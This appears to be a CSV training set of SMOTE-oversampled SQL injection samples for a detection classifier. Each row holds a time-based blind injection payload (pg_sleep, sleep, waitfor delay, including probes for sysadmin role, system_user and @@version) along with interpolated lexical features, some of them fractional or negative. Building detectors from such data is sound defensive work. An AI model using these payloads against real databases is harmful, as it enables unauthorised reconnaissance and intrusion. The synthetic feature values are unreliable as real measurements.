id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000270,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.278599046304344,45.0,17.0,3.0740066546775076,13.0,0.43648571339323494,20.0,11.563514286606765,0.28888888888888886,0.009699682519849664,0.4444444444444444,0.256966984146817,0.0,0.5635142866067652,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.5635142866067652,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000271,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.1507069410023685,43.853799310096505,16.0,2.8243873577824816,11.0,0.0,22.330732796741728,10.52306651335478,0.2530012970557805,0.0,0.5068875001220936,0.2401112028221259,0.23846674332261042,1.5230665133547796,0.0,0.0,0.0,1.0,0.0,3.7615332566773896,0.0,4.0,-5.551115123125783e-17,1.0,0.23846674332261025,0.7615332566773898,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000272,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.8553111705849398,33.24980360633893,16.0,3.151639110090815,11.0,0.0,13.892716861670664,8.357086744668266,0.3327341028287434,0.0,0.41612138837424295,0.25114450879701367,0.821456627665867,0.357086744668266,0.0,0.0,0.0,1.0,0.0,2.1785433723341328,0.0,4.0,-5.551115123125783e-17,1.0,0.821456627665867,0.17854337233413298,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000273,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.214263816744644,53.816877997518,25.2887282138425,4.125331438075324,24.6971672126015,2.4577456427685,13.2042194993795,13.4577456427685,0.44380127527620133,0.046353416528268826,0.24503507228680788,0.264810235908722,2.9154912855370005,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,2.6267630716945,1.0,2.915491285537,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.4577456427685001,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4577456427685
SMOTE_000274,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.4881009060310482,49.61361126725916,24.53814486915342,4.103748972715671,21.844950502783,2.3076289738306843,12.15340281681479,13.307628973830685,0.42623725356590897,0.04714936917375035,0.2446636277189165,0.2819497495414242,2.615257947661368,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,3.077113078507948,1.0,2.615257947661368,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.3076289738306841,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.307628973830684
SMOTE_000275,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.3453402370683341,40.078856869135116,22.60522437248648,4.04917703611729,15.80261218624324,2.131591875837841,9.539428434567558,12.605224372486477,0.3962469645255745,0.05531847621597223,0.23516530905683708,0.31326925020161617,2.0657959379189204,0.0,2.0,0.0,0.0,0.0,0.0,1.8684081241621593,0.0,3.736816248324318,0.9342040620810794,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9342040620810795,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.15585131930627838,42.12297944822022,23.154893716995893,4.0665013213383565,16.81319201422843,2.077446858497946,10.232340575493838,13.0,0.395600418610398,0.04910430742229106,0.2433087697257997,0.3119865042415112,2.077446858497946,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,3.883829712253081,1.0,2.038723429248973,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000277,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.7623341616178942,87.06829288705649,28.044997523697337,4.163630100827771,45.35998018957869,4.0,23.314982665881352,14.393330031596449,0.5230098171007704,0.048946798133466266,0.2572576351042966,0.17078574966146665,4.0,0.0,2.0,0.0,0.0,0.0,0.0,3.3933300315964483,0.0,0.6516674921008878,1.0,3.348332507899112,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.348332507899112
SMOTE_000278,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.10255920503802424,38.22109794832939,17.0,3.321115046806502,13.0,0.03158542118991248,14.189512527139474,11.0,0.34042440156240816,0.0007018982486647271,0.37082228348227403,0.2880514167066531,0.0,0.9684145788100875,2.0,0.0,0.0,0.0,0.0,3.0315854211899125,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.9684145788100875,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000279,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.469151472125658,101.28831562684431,29.29153262507377,4.085672568895207,51.78992412595904,3.645766312536886,29.91532625073772,15.937298937610658,0.5107068222812841,0.03710789534581808,0.2880594502063756,0.16412583216652238,4.0,0.0,2.0,0.0,0.0,0.0,0.0,4.583065250147545,0.0,0.3542336874631138,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000280,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.044363379891077734,37.01916397938601,16.0,3.0070551869663924,11.0,0.0,17.009581989693,9.009581989693002,0.29715121013635065,0.0,0.4594793804359522,0.2433694094276972,0.990418010306998,0.01916397938600395,0.0,0.0,0.0,1.0,0.0,3.0,0.0,4.0,-5.551115123125783e-17,1.0,0.990418010306998,0.009581989693001947,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.6168780806835812,43.67012933692318,17.0,3.12248385626378,13.0,0.8100184767033112,18.86011086021987,11.0,0.2989990167368413,0.01800041059340692,0.43000140466165526,0.2529991680080965,0.0,0.1899815232966887,2.0,0.0,0.0,0.0,0.0,3.810018476703311,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.18998152329668877,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000282,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.4275984464017901,31.283292462308026,22.28329246230803,4.32772240165638,16.0,2.0,2.0,11.283292462308028,0.5115597989950318,0.06394497487437897,0.06394497487437895,0.36055025125621026,2.0,0.2832924623080284,2.0,0.0,0.0,0.0,0.28329246230802835,0.0,0.0,4.0,0.7167075376919714,2.0,1.0,0.28329246230802846,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.28329246230802835,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.3536163168648512,34.54318871846689,17.0,3.4501278659037564,13.0,0.0,11.234550974773512,10.308637743693378,0.37794142476868453,0.0,0.3232123564456595,0.298846218785656,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.308637743693378,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000284,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.2840181292012194,45.0,17.0,3.0740066546775076,13.0,0.4383356696176015,20.0,11.5616643303824,0.28888888888888886,0.00974079265816892,0.4444444444444444,0.25692587400849776,0.0,0.5616643303823986,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.5616643303823985,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000285,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9133779337904243,35.852637446645645,17.0,3.4018764233030696,13.0,0.7622802127795301,12.3771978722047,9.713159361661411,0.36896681023138495,0.023099400387258485,0.33664724263723816,0.27128654674411834,0.0,0.2377197872204701,2.0,0.0,0.0,0.0,0.0,2.47543957444094,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.23771978722047005,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000286,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.7425473933865747,90.00767008882568,28.840306803553027,4.126765562971437,45.923988446189355,3.4201534017765134,25.40306803553027,15.26046020532954,0.5094978382265457,0.039333525082949995,0.2734966877288457,0.1776719489616586,4.0,0.0,2.0,0.0,0.0,0.0,0.0,3.680613607106054,0.0,0.5798465982234862,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000287,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,3.247000227226426,83.49605551030156,30.338073469403476,4.141366162222478,36.87045877552278,4.870458775522781,25.417064489852514,16.338073469403476,0.45242024821022,0.05588021579422714,0.2948325371195213,0.19686699887603162,3.06477061223861,0.0,2.0,0.0,0.0,0.0,0.4676146938806952,3.870458775522781,0.0,0.5323853061193051,1.467614693880695,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.4676146938806952,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4676146938806952,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4676146938806953
SMOTE_000288,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.2697564312864233,26.21254830747475,17.0,3.9399141112886293,12.212548307474755,4.787451692525247,3.0,6.212548307474754,0.4657773166732857,0.18292165593772458,0.11447628928429593,0.23682473810469384,2.2125483074747536,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000289,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.6846757799862022,35.14820493132433,16.683133881258257,3.3413696481474187,12.366267762516516,0.0,12.732535525033034,10.049401643774775,0.3538942929840394,0.0,0.36094508249792623,0.28516062451803437,0.0,1.0,1.3662677625165172,0.0,0.0,0.0,0.0,2.6831338812582586,0.0,4.683133881258258,-5.551115123125783e-17,1.366267762516517,0.0,1.0,0.6831338812582586,0.3168661187417415,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.31686611874174153,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3168661187417414
SMOTE_000290,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.6265853347011711,101.89422127673568,32.60121657331881,4.056802594616328,41.193308846746575,6.700912429989103,35.199391713340596,18.800608286659404,0.40222321469596356,0.06637241126569417,0.3461043215670849,0.18530005247125733,2.1993917133405976,0.0,2.0,0.0,0.0,0.0,0.9003041433297011,6.0,0.0,0.0,1.900304143329701,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.9003041433297011,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9003041433297011,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.900304143329701
SMOTE_000291,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,2.2167108850281307,29.516673637492833,15.838891212497611,3.4018020432765264,11.838891212497611,0.4194456062488052,9.419445606248805,7.838891212497611,0.4017583083333494,0.012710472916630466,0.32062286041670285,0.2649083583333172,0.0,0.0,0.8388912124976108,0.0,0.0,0.0,0.0,2.0,0.0,4.4194456062488054,-5.551115123125783e-17,0.8388912124976107,0.0,0.0,0.4194456062488054,0.5805543937511947,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5805543937511948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5805543937511946
SMOTE_000292,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7055424034679901,40.45485851607752,23.13628537098062,4.092810236754874,16.0,2.0,9.454858516077522,13.0,0.395993581900303,0.04949919773753788,0.23276243506816294,0.3217447852939962,2.0,0.1362853709806194,2.0,0.0,0.0,0.0,0.13628537098061935,1.8637146290193805,0.0,4.0,0.8637146290193805,2.0,1.0,0.13628537098061944,1.0,0.0,0.0,0.0,1.0,0.13628537098061935,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3418300359181793,43.42984437321647,16.47661479107216,3.073332163893057,13.0,0.47661479107215676,18.953229582144314,11.0,0.2996889011366063,0.01059143980160348,0.436136742715431,0.25358291634635916,0.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000294,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9484714061534686,33.0,17.0,3.504123773197531,13.0,0.680675293277017,10.0,9.319324706722982,0.3939393939393939,0.020626524038697486,0.30303030303030304,0.2824037789916055,0.0,0.319324706722983,2.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.319324706722983,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000295,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.3341972184727245,31.416901995149452,22.104225498787365,4.306352075315298,16.0,2.0,2.3126764963620907,11.104225498787363,0.5099811687351232,0.0637476460918904,0.07268126027366445,0.35358992489932195,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.10422549878736342,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.10422549878736354,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.6665187233452083,57.99197668187105,25.343720921637388,4.165144691524965,28.304534838596282,3.1718604608186936,13.51558138245608,13.0,0.4712941816977389,0.053680252797848195,0.2349195365372783,0.2401060289671346,3.171860460818694,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,2.24220930877196,1.0,2.585930230409347,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.3744536451878515,39.49294245649128,23.0,4.115727107805677,16.0,2.0,8.74411871374273,12.748823742748545,0.4070473314955677,0.050880916436945964,0.2185222597202363,0.32354949234725006,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.7488237427485456,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.6000856176648588,34.57209057372734,23.514418114745467,4.338365081696054,16.0,2.0,4.057672458981868,12.514418114745467,0.465242019273955,0.05815525240924437,0.11376802157091645,0.36283470674588425,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.5144181147454665,0.0,4.0,-5.551115123125783e-17,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.5144181147454667,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.2354935344254887,40.663486768783926,17.0,3.2320837007601884,13.0,0.3804981098262752,16.282988658957652,11.0,0.32185653333673037,0.008455513551695,0.3973478095189566,0.27234014359261804,0.0,0.6195018901737248,2.0,0.0,0.0,0.0,0.0,3.3804981098262754,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.6195018901737248,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000300,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,3.0799465836536517,109.65003056874133,30.96841461710709,4.030142395457827,50.173719605911,5.476310962830317,36.01579269144646,17.984207308553543,0.4522706528075789,0.05151940187410441,0.330153630188126,0.1660563151301907,3.0157926914464555,0.0,2.0,0.0,0.0,0.0,0.4921036542767724,6.0,0.0,0.0,1.4921036542767723,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.4921036542767724,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4921036542767724,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4921036542767725
SMOTE_000301,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.43241851837911605,42.91950567215812,17.0,3.1485780067932243,13.0,0.0,18.266254726798433,11.653250945359686,0.3071019705467639,0.0,0.4199268345203818,0.2729711949328542,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.6532509453596864,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000302,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.01711059544153046,33.074670982622386,17.0,3.501511048384963,13.0,0.0,10.059736786097911,10.014934196524479,0.3931652928436275,0.0,0.3040068613357314,0.30282784582064104,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.014934196524478,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
